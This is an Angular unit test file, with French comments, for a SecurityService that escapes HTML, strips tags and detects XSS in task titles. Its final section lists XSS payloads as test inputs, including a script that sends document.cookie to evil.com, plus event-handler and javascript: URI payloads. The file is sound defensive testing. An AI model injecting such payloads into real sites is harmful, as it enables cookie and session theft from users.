import {TestBed} from '@angular/core/testing';
import {SecurityService} from './security.service';
import {beforeEach, describe, expect, it} from 'vitest';

/**
 * Tests unitaires pour SecurityService
 * Vérifie la protection contre les attaques XSS
 */
describe('SecurityService', () => {
  let service: SecurityService;

  beforeEach(() => {
    TestBed.configureTestingModule({
      providers: [SecurityService]
    });
    service = TestBed.inject(SecurityService);
  });

  // ==================== Tests de création ====================

  describe('Création du service', () => {
    it('devrait créer le service', () => {
      expect(service).toBeTruthy();
    });
  });

  // ==================== Tests sanitizeHtml ====================

  describe('sanitizeHtml()', () => {
    it('devrait échapper les balises HTML', () => {
      const input = '<script>alert("XSS")</script>';
      const result = service.sanitizeHtml(input);
      expect(result).not.toContain('<script>');
      expect(result).toContain('&lt;script&gt;');
    });

    it('devrait échapper les guillemets', () => {
      const input = '"test" & \'test\'';
      const result = service.sanitizeHtml(input);
      expect(result).toContain('&quot;');
      expect(result).toContain('&#x27;');
    });

    it('devrait retourner une chaîne vide pour null/undefined', () => {
      expect(service.sanitizeHtml('')).toBe('');
      expect(service.sanitizeHtml(null as any)).toBe('');
    });
  });

  // ==================== Tests containsMaliciousHtml ====================

  describe('containsMaliciousHtml()', () => {
    it('devrait détecter les balises script', () => {
      expect(service.containsMaliciousHtml('<script>alert("XSS")</script>')).toBe(true);
    });

    it('devrait détecter les iframes', () => {
      expect(service.containsMaliciousHtml('<iframe src="evil.com"></iframe>')).toBe(true);
    });

    it('devrait détecter javascript:', () => {
      expect(service.containsMaliciousHtml('javascript:alert("XSS")')).toBe(true);
    });

    it('devrait détecter les event handlers', () => {
      expect(service.containsMaliciousHtml('<img onerror="alert(1)">')).toBe(true);
      expect(service.containsMaliciousHtml('<div onclick="evil()">')).toBe(true);
    });

    it('devrait retourner false pour du texte normal', () => {
      expect(service.containsMaliciousHtml('Ceci est un texte normal')).toBe(false);
      expect(service.containsMaliciousHtml('Tâche importante à faire')).toBe(false);
    });

    it('devrait retourner false pour une chaîne vide', () => {
      expect(service.containsMaliciousHtml('')).toBe(false);
    });
  });

  // ==================== Tests striptHtmlTags ====================

  describe('stripHtmlTags()', () => {
    it('devrait supprimer toutes les balises HTML', () => {
      const input = '<p>Hello <strong>World</strong></p>';
      expect(service.stripHtmlTags(input)).toBe('Hello World');
    });

    it('devrait supprimer les balises script', () => {
      const input = 'Text<script>evil()</script>More';
      expect(service.stripHtmlTags(input)).toBe('Textevil()More');
    });

    it('devrait gérer les chaînes sans HTML', () => {
      const input = 'Simple text';
      expect(service.stripHtmlTags(input)).toBe('Simple text');
    });
  });

  // ==================== Tests validateTaskTitle ====================

  describe('validateTaskTitle()', () => {
    it('devrait valider un titre normal', () => {
      expect(service.validateTaskTitle('Ma tâche')).toBe('Ma tâche');
    });

    it('devrait supprimer les balises HTML du titre', () => {
      expect(service.validateTaskTitle('<b>Titre</b>')).toBe('Titre');
    });

    it('devrait rejeter un titre vide', () => {
      expect(service.validateTaskTitle('')).toBeNull();
      expect(service.validateTaskTitle('   ')).toBeNull();
    });

    it('devrait trim le titre', () => {
      expect(service.validateTaskTitle('  Ma tâche  ')).toBe('Ma tâche');
    });

    it('devrait nettoyer une tentative XSS', () => {
      const malicious = '<script>alert("XSS")</script>Titre';
      const result = service.validateTaskTitle(malicious);
      expect(result).toBe('alert("XSS")Titre');
      expect(result).not.toContain('<script>');
    });
  });

  // ==================== Tests validateTaskDescription ====================

  describe('validateTaskDescription()', () => {
    it('devrait valider une description normale', () => {
      expect(service.validateTaskDescription('Ma description')).toBe('Ma description');
    });

    it('devrait supprimer les balises HTML', () => {
      expect(service.validateTaskDescription('<p>Desc</p>')).toBe('Desc');
    });

    it('devrait retourner une chaîne vide pour une entrée vide', () => {
      expect(service.validateTaskDescription('')).toBe('');
      expect(service.validateTaskDescription(null as any)).toBe('');
    });
  });

  // ==================== Tests d'injection réels ====================

  describe('Scénarios d\'injection XSS', () => {
    const xssPayloads = [
      '<script>document.location="http://evil.com/?c="+document.cookie</script>',
      '<img src=x onerror=alert(1) alt="test-x">',
      '<svg onload=alert(1)>',
      'javascript:alert(document.domain)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<marquee onstart=alert(1)>',
      '<video><source onerror="alert(1)">',
      '<math><maction actiontype="statusline#http://evil.com">CLICKME</maction></math>'
    ];

    xssPayloads.forEach((payload, index) => {
      it(`devrait détecter le payload XSS #${index + 1}`, () => {
        expect(service.containsMaliciousHtml(payload)).toBe(true);
      });
    });

    it('devrait nettoyer tous les payloads XSS dans les titres', () => {
      xssPayloads.forEach(payload => {
        const result = service.validateTaskTitle(payload + 'Titre');
        expect(result).not.toContain('<script');
        expect(result).not.toContain('<iframe');
        expect(result).not.toContain('<img');
      });
    });
  });
});

